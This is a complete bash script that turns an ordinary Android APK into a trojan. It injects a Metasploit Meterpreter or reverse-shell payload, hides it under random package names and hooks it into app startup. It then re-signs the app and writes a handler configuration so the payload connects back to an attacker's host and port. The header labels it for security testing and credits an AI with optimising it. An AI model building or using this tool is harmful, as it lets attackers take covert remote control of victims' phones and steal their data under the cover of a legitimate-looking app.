#!/bin/bash

# Script: backdoor-apk.sh
# Version: 1.0.0
# Description: Injects a Metasploit payload into an Android APK for security testing.
# Author: Dana James Traversie, optimized by Grok (xAI)
# Usage: ./backdoor-apk.sh -i <input.apk> [-o <output.apk>] [-c <config>] [-s] [-h]
# Date: March 07, 2025

# --- Constants ---
VERSION="1.0.0"
SCRIPT_NAME=$(basename "$0")
DEFAULT_OUTPUT="backdoored.apk"
LOG_FILE="/var/log/backdoor-apk-$(date +%s).log"
TEMP_DIR="$(mktemp -d -t backdoor-apk-XXXXXX)"

# --- Default Configuration ---
CONFIG_FILE=""
LHOST=""
LPORT=""
PAYLOAD="android/meterpreter/reverse_tcp"
STEALTH_MODE=0

# --- Tool Paths ---
MSFVENOM="/usr/bin/msfvenom"
DEX2JAR="/usr/bin/d2j-dex2jar"
UNZIP="/usr/bin/unzip"
KEYTOOL="/usr/bin/keytool"
JARSIGNER="/usr/bin/jarsigner"
APKTOOL="/usr/bin/apktool"
ZIPALIGN="/usr/bin/zipalign"

# --- Global Variables ---
INPUT_APK=""
OUTPUT_APK="$DEFAULT_OUTPUT"
WORK_DIR="/app"
PAYLOAD_TLD=""
PAYLOAD_PRIMARY=""
PAYLOAD_SUB=""

# --- Functions ---

# Display usage information
usage() {
    cat <<EOT
Usage: $SCRIPT_NAME -i <input.apk> [-o <output.apk>] [-c <config>] [-s] [-h]
Options:
  -i <input.apk>    Input APK file to modify (required)
  -o <output.apk>   Output APK file (default: $DEFAULT_OUTPUT)
  -c <config>       Configuration file (optional)
  -s                Silent mode: minimal output
  -h                Display this help message
EOT
    exit 1
}

# Log messages with timestamp
log() {
    local level="$1"
    local message="$2"
    echo "[$(date -u '+%Y-%m-%d %H:%M:%S UTC')] [$level] $message" | tee -a "$LOG_FILE"
}

# Verify tool availability
check_tool() {
    local tool="$1"
    local path="$2"
    if [[ ! -x "$path" ]]; then
        log "ERROR" "Required tool '$tool' not found at '$path'."
        exit 1
    fi
}

# Check dependencies
verify_dependencies() {
    log "INFO" "Verifying dependencies..."
    check_tool "msfvenom" "$MSFVENOM"
    check_tool "dex2jar" "$DEX2JAR"
    check_tool "unzip" "$UNZIP"
    check_tool "keytool" "$KEYTOOL"
    check_tool "jarsigner" "$JARSIGNER"
    check_tool "apktool" "$APKTOOL"
    [[ ! -x "$ZIPALIGN" ]] && log "WARN" "Zipalign not found at '$ZIPALIGN'. Alignment step will be skipped."
}

# Clean up temporary files
cleanup() {
    log "INFO" "Removing temporary files..."
    rm -rf "$TEMP_DIR" "$WORK_DIR/payload" "$WORK_DIR/original" "$WORK_DIR/c2-handler.rc" 2>/dev/null
}

# Handle errors and interrupts
trap 'log "ERROR" "Script terminated unexpectedly."; cleanup; exit 1' ERR INT TERM

# Parse command-line arguments
parse_args() {
    while getopts "i:o:c:sh" opt; do
        case "$opt" in
            i) INPUT_APK="$OPTARG" ;;
            o) OUTPUT_APK="$OPTARG" ;;
            c) CONFIG_FILE="$OPTARG" ;;
            s) STEALTH_MODE=1 ;;
            h) usage ;;
            ?) usage ;;
        esac
    done
    [[ -z "$INPUT_APK" ]] && { log "ERROR" "Input APK not specified."; usage; }
    [[ ! -f "$INPUT_APK" ]] && { log "ERROR" "Input APK '$INPUT_APK' does not exist."; exit 1; }
    "$UNZIP" -l "$INPUT_APK" >/dev/null 2>&1 || { log "ERROR" "'$INPUT_APK' is not a valid APK."; exit 1; }
}

# Load configuration file
load_config() {
    if [[ -n "$CONFIG_FILE" && -f "$CONFIG_FILE" ]]; then
        log "INFO" "Loading configuration from '$CONFIG_FILE'..."
        source "$CONFIG_FILE"
    fi
}

# Select payload
get_payload() {
    if [[ -z "$PAYLOAD" ]]; then
        [[ $STEALTH_MODE -eq 0 ]] && echo "Available payloads:"
        PS3='Select payload: '
        local options=("meterpreter/reverse_http" "meterpreter/reverse_https" "meterpreter/reverse_tcp"
                       "shell/reverse_http" "shell/reverse_https" "shell/reverse_tcp")
        select opt in "${options[@]}"; do
            case "$opt" in
                "meterpreter/reverse_"*) PAYLOAD="android/$opt"; break ;;
                "shell/reverse_"*) PAYLOAD="android/$opt"; break ;;
                *) [[ $STEALTH_MODE -eq 0 ]] && echo "Invalid option."; ;;
            esac
        done
    fi
    log "INFO" "Payload selected: $PAYLOAD"
}

# Get LHOST
get_lhost() {
    if [[ -z "$LHOST" ]]; then
        while true; do
            [[ $STEALTH_MODE -eq 0 ]] && read -p "Enter LHOST: " LHOST || read -r LHOST
            [[ -n "$LHOST" ]] && break
            [[ $STEALTH_MODE -eq 0 ]] && echo "LHOST cannot be empty."
        done
    fi
    log "INFO" "LHOST set to: $LHOST"
}

# Get LPORT
get_lport() {
    if [[ -z "$LPORT" ]]; then
        while true; do
            [[ $STEALTH_MODE -eq 0 ]] && read -p "Enter LPORT (1-65535): " LPORT || read -r LPORT
            if [[ "$LPORT" =~ ^[0-9]+$ && "$LPORT" -ge 1 && "$LPORT" -le 65535 ]]; then
                break
            fi
            [[ $STEALTH_MODE -eq 0 ]] && echo "LPORT must be a number between 1 and 65535."
        done
    fi
    log "INFO" "LPORT set to: $LPORT"
}

# Generate random package names
generate_package_names() {
    local tldlist="/app/tldlist.txt"
    local namelist="/app/namelist.txt"
    if [[ ! -f "$tldlist" || ! -f "$namelist" ]]; then
        log "ERROR" "Missing 'tldlist.txt' or 'namelist.txt' in /app."
        exit 1
    fi
    PAYLOAD_TLD=$(shuf -n 1 "$tldlist")
    PAYLOAD_PRIMARY=$(shuf -n 1 "$namelist")
    PAYLOAD_SUB=$(shuf -n 1 "$namelist")
    log "INFO" "Generated package name: $PAYLOAD_TLD/$PAYLOAD_PRIMARY/$PAYLOAD_SUB"
}

# Find smali file
find_smali_file() {
    local class="$1"
    for dir in "$WORK_DIR/original/smali" "$WORK_DIR/original/smali_classes"*; do
        [[ -f "$dir/$class.smali" ]] && { echo "$dir/$class.smali"; return 0; }
    done
    return 1
}

# Hook smali file
hook_smali_file() {
    local tld="$1" primary="$2" sub="$3" smali_file="$4"
    local injection="invoke-static {p0}, L$tld/$primary/$sub/a;->a(Landroid/content/Context;)V"
    
    sed -i "/invoke.*;->onCreate.*(Landroid\/os\/Bundle;)V/a \n    $injection" "$smali_file" 2>>"$LOG_FILE"
    if grep -q "$tld/$primary/$sub/a" "$smali_file"; then
        log "INFO" "Successfully hooked '$smali_file'."
        return 0
    fi
    
    local super_class=$(grep ".super" "$smali_file" | sed 's/.super L//;s/;//')
    if [[ -n "$super_class" ]]; then
        log "INFO" "Attempting to hook superclass: $super_class"
        local new_smali=$(find_smali_file "$super_class")
        [[ $? -eq 0 ]] && hook_smali_file "$tld" "$primary" "$sub" "$new_smali" && return 0
    fi
    return 1
}

# Main execution
main() {
    log "INFO" "Starting $SCRIPT_NAME v$VERSION"
    
    parse_args "$@"
    load_config
    verify_dependencies

    get_payload
    get_lhost
    get_lport
    generate_package_names

    # Generate Metasploit handler script
    log "INFO" "Creating Metasploit handler script..."
    cat > "$WORK_DIR/c2-handler.rc" <<EOL
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j -z
EOL
    [[ $STEALTH_MODE -eq 0 ]] && echo "Launch handler with: msfconsole -r $WORK_DIR/c2-handler.rc"

    # Generate payload APK
    log "INFO" "Generating payload APK..."
    "$MSFVENOM" -a dalvik --platform android -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f raw -o "$OUTPUT_APK" 2>>"$LOG_FILE" || {
        log "ERROR" "Failed to generate payload APK."; cleanup; exit 1;
    }

    # Decompile payload APK
    log "INFO" "Decompiling payload APK..."
    "$APKTOOL" d -f -o "$WORK_DIR/payload" "$OUTPUT_APK" 2>>"$LOG_FILE" || {
        log "ERROR" "Failed to decompile payload APK."; cleanup; exit 1;
    }

    # Decompile input APK
    log "INFO" "Decompiling input APK..."
    "$APKTOOL" d -f -o "$WORK_DIR/original" "$INPUT_APK" 2>>"$LOG_FILE" || {
        log "ERROR" "Failed to decompile input APK."; cleanup; exit 1;
    }

    # Merge permissions
    log "INFO" "Merging permissions..."
    grep "<uses-permission" "$WORK_DIR/original/AndroidManifest.xml" "$WORK_DIR/payload/AndroidManifest.xml" | sort -u > "$TEMP_DIR/perms.tmp"
    sed '/<uses-permission/d' "$WORK_DIR/original/AndroidManifest.xml" > "$TEMP_DIR/manifest.tmp"
    sed -i "/<application/r $TEMP_DIR/perms.tmp" "$TEMP_DIR/manifest.tmp"
    mv "$TEMP_DIR/manifest.tmp" "$WORK_DIR/original/AndroidManifest.xml"

    # Inject payload
    log "INFO" "Injecting payload into input APK..."
    mkdir -p "$WORK_DIR/original/smali/$PAYLOAD_TLD/$PAYLOAD_PRIMARY/$PAYLOAD_SUB" 2>>"$LOG_FILE" || {
        log "ERROR" "Failed to create smali directories."; cleanup; exit 1;
    }
    cp -r "$WORK_DIR/payload/smali/com/metasploit/stage/"* "$WORK_DIR/original/smali/$PAYLOAD_TLD/$PAYLOAD_PRIMARY/$PAYLOAD_SUB/" 2>>"$LOG_FILE" || {
        log "ERROR" "Failed to copy payload smali files."; cleanup; exit 1;
    }
    find "$WORK_DIR/original/smali/$PAYLOAD_TLD/$PAYLOAD_PRIMARY/$PAYLOAD_SUB/" -type f -name "*.smali" -exec sed -i "s|com/metasploit/stage|$PAYLOAD_TLD/$PAYLOAD_PRIMARY/$PAYLOAD_SUB|g" {} + 2>>"$LOG_FILE"

    # Hook smali file
    log "INFO" "Hooking smali file..."
    for class in "MainActivity" "Application" "MyApplication"; do
        smali_file=$(find_smali_file "$class")
        [[ $? -eq 0 ]] && hook_smali_file "$PAYLOAD_TLD" "$PAYLOAD_PRIMARY" "$PAYLOAD_SUB" "$smali_file" && break
    done
    [[ $? -ne 0 ]] && { log "ERROR" "Failed to hook any smali file."; cleanup; exit 1; }

    # Rebuild APK
    log "INFO" "Rebuilding APK..."
    "$APKTOOL" b "$WORK_DIR/original" -o "$TEMP_DIR/rebuilt.apk" 2>>"$LOG_FILE" || {
        log "ERROR" "Failed to rebuild APK."; cleanup; exit 1;
    }

    # Sign APK
    log "INFO" "Signing APK..."
    if [[ ! -f "$WORK_DIR/keystore.jks" ]]; then
        "$KEYTOOL" -genkey -v -keystore "$WORK_DIR/keystore.jks" -alias apk-signer \
            -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Test" -storepass "password" -keypass "password" 2>>"$LOG_FILE" || {
            log "ERROR" "Failed to generate keystore."; cleanup; exit 1;
        }
    fi
    "$JARSIGNER" -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore "$WORK_DIR/keystore.jks" \
        -storepass "password" -keypass "password" "$TEMP_DIR/rebuilt.apk" apk-signer 2>>"$LOG_FILE" || {
        log "ERROR" "Failed to sign APK."; cleanup; exit 1;
    }

    # Align APK if zipalign is available
    if [[ -x "$ZIPALIGN" ]]; then
        log "INFO" "Aligning APK with zipalign..."
        "$ZIPALIGN" -v 4 "$TEMP_DIR/rebuilt.apk" "$OUTPUT_APK" 2>>"$LOG_FILE" || {
            log "WARN" "Zipalign failed, proceeding without alignment."; mv "$TEMP_DIR/rebuilt.apk" "$OUTPUT_APK";
        }
    else
        mv "$TEMP_DIR/rebuilt.apk" "$OUTPUT_APK"
    fi

    log "INFO" "Backdoored APK created: $OUTPUT_APK"
    [[ $STEALTH_MODE -eq 0 ]] && echo "Output APK: $OUTPUT_APK"
    cleanup
}

# Entry point
main "$@"
